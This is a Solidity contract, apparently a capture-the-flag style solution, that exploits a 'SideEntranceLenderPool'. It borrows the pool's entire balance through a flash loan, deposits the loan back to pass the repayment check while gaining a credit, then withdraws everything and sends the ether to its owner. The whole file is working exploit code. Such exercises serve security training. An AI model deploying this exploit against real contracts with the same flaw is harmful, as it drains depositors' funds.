// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "../Attacker.sol";


interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title Attacker
 * @dev This contract is used to exploit the "SideEntranceLenderPool" contract's vulnerability.
 * @author Kristian Apostolov @CrisCodesCrap
 */
contract SideEntranceAttacker is Attacker {

    IFlashLoanerPool public immutable pool;

    constructor(address _pool) {
        pool = IFlashLoanerPool(_pool);
    }

    function startAttack() external override {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function finalizeAttack() external onlyOwner {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(owner(), address(this).balance);
    }

}